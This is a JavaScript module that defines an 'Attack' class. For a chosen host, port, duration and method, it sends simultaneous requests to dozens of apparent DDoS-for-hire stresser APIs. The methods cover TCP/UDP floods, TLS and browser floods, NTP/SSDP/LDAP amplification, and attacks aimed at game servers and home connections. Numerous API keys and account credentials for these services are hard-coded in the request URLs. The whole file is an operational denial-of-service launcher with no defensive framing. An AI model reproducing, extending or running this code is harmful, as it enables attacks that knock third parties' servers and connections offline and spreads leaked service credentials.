const { all, get } = require("axios");

class Attack {
    static async send(host, port, time, method) {
        switch(method.toLowerCase()) {
            // Layer 7
            case "ovh": 
                all([ 
                    get(`http://51.210.54.87/api/attack?username=dekurlas&secret=dekurlasisgay234&host=${host}&port=${port}&time=${time}&method=OVH-TCP`),
                    get(`http://45.153.243.106:443/api/attack?username=dekurlas&secret=65865om&host=${host}&port=${port}&time=${time}&method=ovh`),
	                get(`https://silence-network.xyz/api.php?key=8l1VcQ3gidTVgthPSa6RsWyRtvmBpPJ8&username=luta&host=${host}&port=${port}&time=${time}&method=ORBITAL-OVH`),
                    get(`http://cronical.us/api/attack?username=DEKURLAS&secret=f3ioh2fiho4oihf&host=${host}&port=${port}&time=${time}&method=OVH`),
                    get(`https://govslapped.homes/alpine/api?key=roseiscooll&host=${host}&port=${port}&time=${time}&method=.ovhtcp`),
                    get(`http://51.91.41.67:1337/api/attack?username=DEKURLAS&secret=DEKURLAS2023&host=${host}&port=${port}&time=${time}&method=ovhack`),
                    get(`https://apisystem.dstat.space/api/attack?username=humanity&secret=humanityc209o0894324&host=${host}&port=${port}&time=${time}&method=ovh-h`),
                    get(`https://api.xenemaspace.space/api?key=qewdekurlas2231&host=${host}&port=${port}&time=${time}&method=OVH`),
                    get(`https://saturn.sh/api/attack?username=DEKURLAS&secret=DEKURLASg43g4g3&host=${host}&port=${port}&time=${time}&method=ovh`),
                    get(`http://cnc.spacevin.xyz:810/api/attack?username=dekurlas&password=dekurlasisgay234&host=${host}&port=${port}&time=${time}&method=ovh-tcp`),
                    get(`http://45.42.247.162:1337/api?username=luta&key=luta&host=${host}&port=${port}&time=${time}&method=OVH`),
                    get(`https://api.micmusic.biz/api/attack?username=umar2lslsls&&secret=umar2&host=${host}&port=${port}&time=${time}&method=SUS-OVH`),
                    get(`https://orbitalstress.org/api/layer4?key=xMAeHUWVAsXTBWnjHqSoxekm&ip=${host}&time=${time}&port=${port}&method=ovhtcp`),
                    get(`http://suki-ssh.gay:8080/suki/api?key=dek&host=${host}&port=${port}&time=${time}&method=!*OVH`),
                    get(`http://api.skynetstresser.xyz:8082/attack?key=dekurlaslala329&host=${host}&time=${time}&port=${port}&method=OVH`),
                    get(`http://51.91.41.67:1337/api/attack?key=DEKURLAS55&host=${host}&port=${port}&time=${time}&method=OVHACK`),
                    get(`https://rest.booter.gay/attackPool?username=dekurlashumanity&target=${host}&port=${port}&duration=${time}&method=ovhtcp`),

                    get(`https://eclipse-api.xyz/client/api.php?key=jrnjkzafu28r7oa&host=${host}&method=ECLIPSE-NFOCRUSH&port=${port}&time=${time}`),
                    get(`https://wraith-api.cc/api/api.php?key=rimp9n8fx6s9jxf&host=${host}&method=WRAV2&port=${port}&time=${time}`),
                    get(`https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-Ermge9A1kMWX5iAoOhbFr9SeBz55PR&host=${host}&method=NFO-XRS&port=${port}&time=${time}`),
                    get(`http://api.perseus.sh:8080/api/launch?token=63656e7472616c.1eyun3orvjldy2ovlp7t4j0tqr3soqu0afpxd7o&target=${host}&method=nfo&port=${port}&duration=${time}`),
                ]);
            case "tls":
                all([
                    get(`http://51.210.54.87/api/attack?username=dekurlas&secret=dekurlasisgay234&host=${host}&port=${port}&time=${time}&method=https-vip`),
		            get(`https://silence-network.xyz/api.php?key=8l1VcQ3gidTVgthPSa6RsWyRtvmBpPJ8&username=luta&host=${host}&port=${port}&time=${time}&method=ORBITAL-HTTPS`),
                    get(`http://cronical.us/api/attack?username=DEKURLAS&secret=f3ioh2fiho4oihf&host=${host}&port=${port}&time=${time}&method=TLS`),
                    get(`http://51.91.41.67:1337/api/attack?key=DEKURLAS55&host=${host}&port=${port}&time=${time}&method=HTTPS-STRONG`),
                    get(`https://apisystem.dstat.space/api/attack?username=humanity&secret=humanityc209o0894324&host=${host}&port=${port}&time=${time}&method=tls-h`),
                    get(`https://api.xenemaspace.space/api?key=qewdekurlas2231&host=${host}&port=${port}&time=${time}&method=HTTP-QUERY`),
                    get(`http://51.91.41.67:1337/api/attack?username=DEKURLAS&secret=DEKURLAS2023&host=${host}&port=${port}&time=${time}&method=tlsv2`),
                    get(`https://api.xenemaspace.space/api?key=qewdekurlas2231&host=${host}&port=${port}&time=${time}&method=HTTP-QUERY`),
                    get(`https://saturn.sh/api/attack?username=DEKURLAS&secret=DEKURLASg43g4g3&host=${host}&port=${port}&time=${time}&method=https`),
                    get(`https://govslapped.homes/alpine/api?key=roseiscooll&host=${host}&port=${port}&time=${time}&method=.TLS`),
                    get(`http://45.153.243.106:443/api/attack?username=dekurlas&secret=65865om&host=${host}&port=${port}&time=${time}&method=HTTPS`),
                    get(`http://45.42.247.162:1337/api?username=luta&key=luta&host=${host}&port=${port}&time=${time}&method=TLS-VIP`),
                    get(`https://api.micmusic.biz/api/attack?username=umar2lslsls&&secret=umar2&host=${host}&port=${port}&time=${time}&method=SUS-RAW`),
                    get(`http://suki-ssh.gay:8080/suki/api?key=dek&host=${host}&port=${port}&time=${time}&method=!*BROWSER`),
                    get(`https://rest.booter.gay/attackPool?username=dekurlashumanity&target=${host}&port=${port}&duration=${time}&method=exhaust`),
                    get(`http://api.skynetstresser.xyz:8082/attack?key=dekurlaslala329&host=${host}&time=${time}&port=${port}&method=TLS`),
                    get(`http://cnc.spacevin.xyz:810/api/attack?username=dekurlas&password=dekurlasisgay234&host=${host}&port=${port}&time=${time}&method=https-smack`),
                    get(`https://wraith-api.cc/api/api.php?key=rimp9n8fx6s9jxf&host=${host}&method=UDP-BYPASS&port=${port}&time=${time}`),
                    get(`https://eclipse-api.xyz/client/api.php?key=jrnjkzafu28r7oa&host=${host}&method=ECLIPSE-OVHDOWN&port=${port}&time=${time}`),
                    get(`https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-Ermge9A1kMWX5iAoOhbFr9SeBz55PR&host=${host}&method=OVH-ORPHICV2&port=${port}&time=${time}`),
                    get(`http://api.perseus.sh:8080/api/launch?token=63656e7472616c.1eyun3orvjldy2ovlp7t4j0tqr3soqu0afpxd7o&target=${host}&method=ovh-vip&port=${port}&duration=${time}`),
                    get(`https://anonarchive.org/api-1.0/api/sp00ky?key=8739827937-EQ8EEH&host=${host}&port=${port}&time=${time}&method=NUKE`),
                    get(`https://anonarchive.org/api-1.0/api/sp00ky?key=8739827937-EQ8EEH&host=${host}&port=${port}&time=${time}&method=NUKE`),
                    get(`https://anonarchive.org/api-1.0/api/sp00ky?key=8739827937-EQ8EEH&host=${host}&port=${port}&time=${time}&method=NUKE`),
                    get(`https://anonarchive.org/api-1.0/api/sp00ky?key=8739827937-EQ8EEH&host=${host}&port=${port}&time=${time}&method=NUKE`),
                ]);
                break;
            case "mixamp":
                all([
                    get(`http://cronical.us/api/attack?username=DEKURLAS&secret=f3ioh2fiho4oihf&host=${host}&port=${port}&time=${time}&method=MIXAMP`),
					get(`https://silence-network.xyz/api.php?key=8l1VcQ3gidTVgthPSa6RsWyRtvmBpPJ8&username=luta&host=${host}&port=${port}&time=${time}&method=ORBITAL-SYN`),
                    get(`https://govslapped.homes/alpine/api?key=roseiscooll&host=${host}&port=${port}&time=${time}&method=.ldap`),
                    get(`http://45.42.247.162:1337/api?username=luta&key=luta&host=${host}&port=${port}&time=${time}&method=MIXAMP`),
                    get(`https://saturn.sh/api/attack?username=DEKURLAS&secret=DEKURLASg43g4g3&host=${host}&port=${port}&time=${time}&method=mixamp`),
                    get(`https://orbitalstress.org/api/layer4?key=xMAeHUWVAsXTBWnjHqSoxekm&ip=${host}&time=${time}&port=${port}&method=NTP`),
                    get(`http://51.91.41.67:1337/api/attack?username=DEKURLAS&secret=DEKURLAS2023&host=${host}&port=${port}&time=${time}&method=mixamp`),
                    get(`http://kittyddos.icu/udp.php?key=newkitty&host=${host}&time=${time}&method=ssdp&port=${port}&xian=250`),
                    get(`http://45.153.243.106:443/api/attack?username=dekurlas&secret=65865om&host=${host}&port=${port}&time=${time}&method=Mixamp`),
                    get(`https://apisystem.dstat.space/api/attack?username=humanity&secret=humanityc209o0894324&host=${host}&port=${port}&time=${time}&method=tls-h`),
                    get(`https://wraith-api.cc/api/api.php?key=rimp9n8fx6s9jxf&host=${host}&method=SSDP&port=${port}&time=${time}`),
                    get(`https://rest.booter.gay/attackPool?username=dekurlashumanity&target=${host}&port=${port}&duration=${time}&method=amp`),
                    get(`https://eclipse-api.xyz/client/api.php?key=jrnjkzafu28r7oa&host=${host}&method=ECLIPSE-NTP&port=${port}&time=${time}`),
                    get(`http://api.perseus.sh:8080/api/launch?token=63656e7472616c.1eyun3orvjldy2ovlp7t4j0tqr3soqu0afpxd7o&target=${host}&method=udp&port=${port}&duration=${time}`),
                    get(`https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-Ermge9A1kMWX5iAoOhbFr9SeBz55PR&host=${host}&method=HOME-ORPHIC&port=${port}&time=${time}`),
                    get(`https://anonarchive.org/api-1.0/api/sp00ky?key=8739827937-EQ8EEH&host=${host}&port=${port}&time=${time}&method=NUKE`),
                    get(`https://anonarchive.org/api-1.0/api/sp00ky?key=8739827937-EQ8EEH&host=${host}&port=${port}&time=${time}&method=NUKE`),
                    get(`https://anonarchive.org/api-1.0/api/sp00ky?key=8739827937-EQ8EEH&host=${host}&port=${port}&time=${time}&method=NUKE`)
                ]);
                break;
            case "tcp":
                all([
					 get(`https://silence-network.xyz/api.php?key=8l1VcQ3gidTVgthPSa6RsWyRtvmBpPJ8&username=luta&host=${host}&port=${port}&time=${time}&method=ORBITAL-TCP`),
                     get(`http://cronical.us/api/attack?username=DEKURLAS&secret=f3ioh2fiho4oihf&host=${host}&port=${port}&time=${time}&method=TCPKILL`),
                     get(`https://govslapped.homes/alpine/api?key=roseiscooll&host=${host}&port=${port}&time=${time}&method=.TCP`),
                     get(`http://kittyddos.icu/udp.php?key=newkitty&host=${host}&time=${time}&method=ntp&port=${port}&xian=250`),
                     get(`http://51.91.41.67:1337/api/attack?username=DEKURLAS&secret=DEKURLAS2023&host=${host}&port=${port}&time=${time}&method=tcp-raw`),
                     get(`https://apisystem.dstat.space/api/attack?username=humanity&secret=humanityc209o0894324&host=${host}&port=${port}&time=${time}&method=tcplegit`),
                     get(`http://45.153.243.106:443/api/attack?username=dekurlas&secret=65865om&host=${host}&port=${port}&time=${time}&method=tcp`),
                     get(`http://51.210.54.87/api/attack?username=dekurlas&secret=dekurlasisgay234&host=${host}&port=${port}&time=${time}&method=TCP-RAIL`),
                     get(`http://45.42.247.162:1337/api?username=luta&key=luta&host=${host}&port=${port}&time=${time}&method=TCP-VIP`),
                     get(`https://api.xenemaspace.space/api?key=qewdekurlas2231&host=${host}&port=${port}&time=${time}&method=SYN`),
                     get(`https://api.micmusic.biz/api/attack?username=umar2lslsls&&secret=umar2&host=${host}&port=${port}&time=${time}&method=TCPLEGIT`),
                     get(`http://suki-ssh.gay:8080/suki/api?key=dek&host=${host}&port=${port}&time=${time}&method=!*TCP`),
                     get(`https://rest.booter.gay/attackPool?username=dekurlashumanity&target=${host}&port=${port}&duration=${time}&method=tcp`),
                     get(`https://saturn.sh/api/attack?username=DEKURLAS&secret=DEKURLASg43g4g3&host=${host}&port=${port}&time=${time}&method=tcpkill`),
                     get(`http://api.skynetstresser.xyz:8082/attack?key=dekurlaslala329&host=${host}&time=${time}&port=${port}&method=TCP`),

                     get(`http://51.91.41.67:1337/api/attack?key=DEKURLAS55&host=${host}&port=${port}&time=${time}&method=TCP-BYPASS`),

                     get(`https://eclipse-api.xyz/client/api.php?key=jrnjkzafu28r7oa&host=${host}&method=ECLIPSE-GAMEKILLERV2&port=${port}&time=${time}`),
                     get(`https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-Ermge9A1kMWX5iAoOhbFr9SeBz55PR&host=${host}&method=GAME-STORMV2&port=${port}&time=${time}`),
                    get(`http://api.perseus.sh:8080/api/launch?token=63656e7472616c.1eyun3orvjldy2ovlp7t4j0tqr3soqu0afpxd7o&target=${host}&method=game&port=${port}&duration=${time}`)
                ]);
                break;
            // Server Bypasses
            case "udp":
                all([
                    get(`https://silence-network.xyz/api.php?key=8l1VcQ3gidTVgthPSa6RsWyRtvmBpPJ8&username=luta&host=${host}&port=${port}&time=${time}&method=UDP-ORBITAL`),
                    get(`http://cronical.us/api/attack?username=DEKURLAS&secret=f3ioh2fiho4oihf&host=${host}&port=${port}&time=${time}&method=UDP`),
                    get(`https://govslapped.homes/alpine/api?key=roseiscooll&host=${host}&port=${port}&time=${time}&method=.UDP`),
                    get(`https://api.xenemaspace.space/api?key=qewdekurlas2231&host=${host}&port=${port}&time=${time}&method=UDP`),
                    get(`http://kittyddos.icu/udp.php?key=newkitty&host=${host}&time=${time}&method=ssdp&port=${port}&xian=250`),
                    get(`http://51.91.41.67:1337/api/attack?username=DEKURLAS&secret=DEKURLAS2023&host=${host}&port=${port}&time=${time}&method=udp-raw`),
                    get(`https://apisystem.dstat.space/api/attack?username=humanity&secret=humanityc209o0894324&host=${host}&port=${port}&time=${time}&method=handshake`),
                    get(`http://45.153.243.106:443/api/attack?username=dekurlas&secret=65865om&host=${host}&port=${port}&time=${time}&method=udp`),
                    get(`http://45.42.247.162:1337/api?username=luta&key=luta&host=${host}&port=${port}&time=${time}&method=UDP-VIP`),
                    get(`https://rest.booter.gay/attackPool?username=dekurlashumanity&target=${host}&port=${port}&duration=${time}&method=udp`),
                    get(`https://saturn.sh/api/attack?username=DEKURLAS&secret=DEKURLASg43g4g3&host=${host}&port=${port}&time=${time}&method=udp`),
                    get(`https://api.micmusic.biz/api/attack?username=umar2lslsls&&secret=umar2&host=${host}&port=${port}&time=${time}&method=UDP-VIP`),
                    get(`http://suki-ssh.gay:8080/suki/api?key=dek&host=${host}&port=${port}&time=${time}&method=!*UDP`),
                    get(`http://51.91.41.67:1337/api/attack?key=DEKURLAS55&host=${host}&port=${port}&time=${time}&method=UDP-BYPASS`),
                    get(`http://api.skynetstresser.xyz:8082/attack?key=dekurlaslala329&host=${host}&time=${time}&port=${port}&method=UDP`),
                    get(`http://51.210.54.87/api/attack?username=dekurlas&secret=dekurlasisgay234&host=${host}&port=${port}&time=${time}&method=UDP-NULL`),

                    get(`https://wraith-api.cc/api/api.php?key=rimp9n8fx6s9jxf&host=${host}&method=WRA&port=${port}&time=${time}`),
                    get(`https://eclipse-api.xyz/client/api.php?key=jrnjkzafu28r7oa&host=${host}&method=ECLIPSE-TCP&port=${port}&time=${time}`),
                    get(`https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-Ermge9A1kMWX5iAoOhbFr9SeBz55PR&host=${host}&method=TCP-XV&port=${port}&time=${time}`),
                    get(`http://api.perseus.sh:8080/api/launch?token=63656e7472616c.1eyun3orvjldy2ovlp7t4j0tqr3soqu0afpxd7o&target=${host}&method=tcp-vip&port=${port}&duration=${time}`),
					get(`https://eclipse-api.xyz/client/api.php?key=jrnjkzafu28r7oa&host=${host}&method=CF-ECLIPSE&port=${port}&time=${time}`),
                    get(`https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-Ermge9A1kMWX5iAoOhbFr9SeBz55PR&host=${host}&method=HTTPS-STORMV2&port=${port}&time=${time}`),
                    get(`http://13.67.224.94:9999/server?host=${host}&port=${port}&time=${time}&method=http-raw`),
                    get(`http://13.67.224.94:9999/server?host=${host}&port=${port}&time=${time}&method=http-raw`),
                    get(`http://13.67.224.94:9999/server?host=${host}&port=${port}&time=${time}&method=http-raw`),
                ]);
                break;
            case "browser":
                all([
					get(`https://silence-network.xyz/api.php?key=8l1VcQ3gidTVgthPSa6RsWyRtvmBpPJ8&username=luta&host=${host}&port=${port}&time=${time}&method=ORBITAL-HTTPS`),
                    get(`http://cronical.us/api/attack?username=DEKURLAS&secret=f3ioh2fiho4oihf&host=${host}&port=${port}&time=${time}&method=TLS`),
                    get(`http://45.153.243.106:443/api/attack?username=dekurlas&secret=65865om&host=${host}&port=${port}&time=${time}&method=CF-PRO`),
                    get(`https://govslapped.homes/alpine/api?key=roosiscooll&host=${host}&port=${port}&time=${time}&method=.bypass`),
                    get(`http://45.42.247.162:1337/api?username=luta&key=luta&host=${host}&port=${port}&time=${time}&method=BROWSER-VIP`),
                    get(`http://51.91.41.67:1337/api/attack?username=DEKURLAS&secret=DEKURLAS2023&host=${host}&port=${port}&time=${time}&method=https`),
                    get(`https://api.xenemaspace.space/api?key=qewdekurlas2231&host=${host}&port=${port}&time=${time}&method=BROWSER`),
                    get(`https://rest.booter.gay/attackPool?username=dekurlashumanity&target=${host}&port=${port}&duration=${time}&method=exhaust`),
                    get(`https://saturn.sh/api/attack?username=DEKURLAS&secret=DEKURLASg43g4g3&host=${host}&port=${port}&time=${time}&method=https`),
                    get(`https://api.micmusic.biz/api/attack?username=umar2lslsls&&secret=umar2&host=${host}&port=${port}&time=${time}&method=SUS-BYPASS`),
                    get(`https://orbitalstress.org/api/layer7?key=xMAeHUWVAsXTBWnjHqSoxekm&url=${host}&time=${time}&port=${port}&method=HTTP-NEMESIS`),
                    get(`http://51.91.41.67:1337/api/attack?key=DEKURLAS55&host=${host}&port=${port}&time=${time}&method=HTTPS-STRONG`),
                    get(`http://suki-ssh.gay:8080/suki/api?key=dek&host=${host}&port=${port}&time=${time}&method=!*https`),
                    get(`https://apisystem.dstat.space/api/attack?username=humanity&secret=humanityc209o0894324&host=${host}&port=${port}&time=${time}&method=cf-uam`),
                    get(`http://cnc.spacevin.xyz:810/api/attack?username=dekurlas&password=dekurlasisgay234&host=${host}&port=${port}&time=${time}&method=https-smack`),
                    get(`http://api.skynetstresser.xyz:8082/attack?key=dekurlaslala329&host=${host}&time=${time}&port=${port}&method=HTTPS`),
                    get(`http://51.210.54.87/api/attack?username=dekurlas&secret=dekurlasisgay234&host=${host}&port=${port}&time=${time}&method=BROWSER-VIP`),

                    get(`https://wraith-api.cc/api/api.php?key=rimp9n8fx6s9jxf&host=${host}&method=UDP-RAPE&port=${port}&time=${time}`),
                   get(`https://eclipse-api.xyz/client/api.php?key=jrnjkzafu28r7oa&host=${host}&method=STD&port=${port}&time=${time}`),
                    get(`https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-Ermge9A1kMWX5iAoOhbFr9SeBz55PR&host=${host}&method=LDAP&port=${port}&time=${time}`),
                    get(`http://api.perseus.sh:8080/api/launch?token=63656e7472616c.1eyun3orvjldy2ovlp7t4j0tqr3soqu0afpxd7o&target=${host}&method=udp&port=${port}&duration=${time}`),
					get(`https://eclipse-api.xyz/client/api.php?key=jrnjkzafu28r7oa&host=${host}&method=CF-ECLIPSE&port=${port}&time=${time}`),
                    get(`https://api.orphicsecurityteam.com/api/api.php?key=OrphicAPI-Ermge9A1kMWX5iAoOhbFr9SeBz55PR&host=${host}&method=HTTPS-STORMV2&port=${port}&time=${time}`),
                    get(`http://13.67.224.94:9999/server?host=${host}&port=${port}&time=${time}&method=http-raw`),
                    get(`http://13.67.224.94:9999/server?host=${host}&port=${port}&time=${time}&method=http-raw`),
                    get(`http://13.67.224.94:9999/server?host=${host}&port=${port}&time=${time}&method=http-raw`)
                ]);
                break;
             case "socket-vip":
                all([
                    get(`http://45.42.247.162:1337/api?username=luta&key=luta&host=${host}&port=${port}&time=${time}&method=SOCKET-VIP`),
                    get(`http://51.210.54.87/api/attack?username=dekurlas&secret=dekurlasisgay234&host=${host}&port=${port}&time=${time}&method=GAME-SLAP`),
                    get(`http://cronical.us/api/attack?username=DEKURLAS&secret=f3ioh2fiho4oihf&host=${host}&port=${port}&time=${time}&method=SOCKET`),
                    get(`http://suki-ssh.gay:8080/suki/api?key=dek&host=${host}&port=${port}&time=${time}&method=!*SOCKET`),
                    get(`https://apisystem.dstat.space/api/attack?username=humanity&secret=humanityc209o0894324&host=${host}&port=${port}&time=${time}&method=socket`),
                    get(`https://saturn.sh/api/attack?username=DEKURLAS&secret=DEKURLASg43g4g3&host=${host}&port=${port}&time=${time}&method=socket`),
                    get(`http://api.skynetstresser.xyz:8082/attack?key=dekurlaslala329&host=${host}&time=${time}&port=${port}&method=SOCKET`),
                    get(`http://51.91.41.67:1337/api/attack?username=DEKURLAS&secret=DEKURLAS2023&host=${host}&port=${port}&time=${time}&method=tcp-socket`),
                    get(`https://rest.booter.gay/attackPool?username=dekurlashumanity&target=${host}&port=${port}&duration=${time}&method=socket`)
                ]);
                break;
            case "game-vip":
                all([
                    get(`http://194.85.249.36/spoof.php?&host=${host}&port=${port}&time=${time}&method=kill-all`),
                    get(`https://apisystem.dstat.space/api/attack?username=humanity&secret=humanityc209o0894324&host=${host}&port=${port}&time=${time}&method=game-kill`),
                    get(`https://saturn.sh/api/attack?username=DEKURLAS&secret=DEKURLASg43g4g3&host=${host}&port=${port}&time=${time}&method=pudp`),
                    get(`http://51.91.41.67:1337/api/attack?key=DEKURLAS55&host=${host}&port=${port}&time=${time}&method=GAME`),
                    get(`https://api.xenemaspace.space/api?key=qewdekurlas2231&host=${host}&port=${port}&time=${time}&method=GAME`),
                    get(`http://45.153.243.106:443/api/attack?username=dekurlas&secret=65865om&host=${host}&port=${port}&time=${time}&method=pudp`),
                    get(`http://51.210.54.87/api/attack?username=dekurlas&secret=dekurlasisgay234&host=${host}&port=${port}&time=${time}&method=GAME-VIP`),
                    get(`https://api.micmusic.biz/api/attack?username=umar2lslsls&&secret=umar2&host=${host}&port=${port}&time=${time}&method=SUS-GAME`),
                    get(`http://cronical.us/api/attack?username=DEKURLAS&secret=f3ioh2fiho4oihf&host=${host}&port=${port}&time=${time}&method=PUDP`),
                    get(`https://govslapped.homes/alpine/api?key=roosiscooll&host=${host}&port=${port}&time=${time}&method=.game`),
                    get(`http://45.42.247.162:1337/api?username=luta&key=luta&host=${host}&port=${port}&time=${time}&method=GAME`),
                    get(`http://suki-ssh.gay:8080/suki/api?key=dek&host=${host}&port=${port}&time=${time}&method=!*PPS`),
                    get(`http://suki-ssh.gay:8080/suki/api?key=dek&host=${host}&port=${port}&time=${time}&method=!*game`),
                    get(`http://api.skynetstresser.xyz:8082/attack?key=dekurlaslala329&host=${host}&time=${time}&port=${port}&method=GAME`),
                    get(`http://api.skynetstresser.xyz:8082/attack?key=dekurlaslala329&host=${host}&time=${time}&port=${port}&method=PPS`),
                    get(`https://rest.booter.gay/attackPool?username=dekurlashumanity&target=${host}&port=${port}&duration=${time}&method=game`)
                ]);
                break;
            case "syn":
                all([
                    get(`https://api.vortex-api.com/api?key=v-CjtiGZnn&host=${host}&port=${port}&time=${time}&method=PORT-KILL`),
                    get(`https://stormapi.xyz/AllAPI.php?key=LOGICTHAGOD-07/08/2021-KERGKERGKERG&host=${host}&port=${port}&time=${time}&method=TCP`)
                ]);
                break;
            case "ack":
                all([
                    get(`https://api.vortex-api.com/api?key=v-CjtiGZnn&host=${host}&time=${time}&port=${port}&method=NET-CRASHV3`)         
                ]);


                break;
            case "port-kill":
                all([
                    get(`https://api.vortex-api.com/api?key=v-CjtiGZnn&host=${host}&time=${time}&port=${port}&method=PORT-KILL`)         
                ]);
                break;
            case "tcp":
                all([
                    get(`https://stormapi.xyz/AllAPI.php?key=LOGICTHAGOD-07/08/2021-KERGKERGKERG&host=${host}&port=${port}&time=${time}&method=TCP`),
                    get(`https://api.vortex-api.com/api?key=v-CjtiGZnn&host=${host}&time=${time}&port=${port}&method=TCP2`)
                ]);
                break;
            // Game Bypasses
            case "battlefield-down":
                all([
                    get(`https://stormapi.xyz/AllAPI.php?key=LOGICTHAGOD-07/08/2021-KERGKERGKERG&host=${host}&port=${port}&time=${time}&method=UDP`),
                    get(`https://nebapi.xyz/client/api/api.php?key=ouZoNDqCdMcRJwo4&host=${host}&port=${port}&time=${time}&method=NEB-UDP`),
                    get(`https://api.vortex-api.com/api?key=v-CjtiGZnn&host=${host}&time=${time}&port=${port}&method=UDP`)
                ]);
                break;
            case "cod":
                all([
                    get(`https://api.vortex-api.com/api?key=v-CjtiGZnn&host=${host}&time=${time}&port=${port}&method=COD`)
                ]);
                break;
            case "path":
                all([
                    get(`http://194.85.249.36/spoof.php?&host=${host}&port=${port}&time=${time}&method=RANDPROTOCOLS`),
                    get(`http://176.126.175.209/spoof.php?&host=${host}&port=${port}&time=${time}&method=RANDPROTOCOLS`)
                ]);
                break;
            // Home
            case "home-gone":
                all([
                    get(`https://api.vortex-api.com/api?key=v-CjtiGZnn&host=${host}&time=${time}&port=${port}&method=CLDAP`),
                    get(`https://stormapi.xyz/AllAPI.php?key=LOGICTHAGOD-07/08/2021-KERGKERGKERG&host=${host}&port=${port}&time=${time}&method=STD`),
                    get(`http://45.61.188.175/spoof.php?host=${host}&port=${port}&time=${time}&method=HOME-HOLD`)
                ]);
                break;
            // Amplification
            case "ntp":
                all([
                    get(`https://api.vortex-api.com/api?key=v-CjtiGZnn&host=${host}&time=${time}&port=${port}&method=NTP`)         
                ]);
                break; 
            case "ssdp":
                all([
                    get(`https://api.vortex-api.com/api?key=v-CjtiGZnn&host=${host}&time=${time}&port=${port}&method=SSDP`)         
                ]);
                break;
  	        case "dvr":
          		all([
          		      get(`http://194.85.249.36/spoof.php?host=${host}&port=${port}&time=${time}&method=DVR`),
                    get(`http://176.126.175.209/spoof.php?&host=${host}&port=${port}&time=${time}&method=DVR`)
          		]);
        }
    }
}

module.exports = Attack;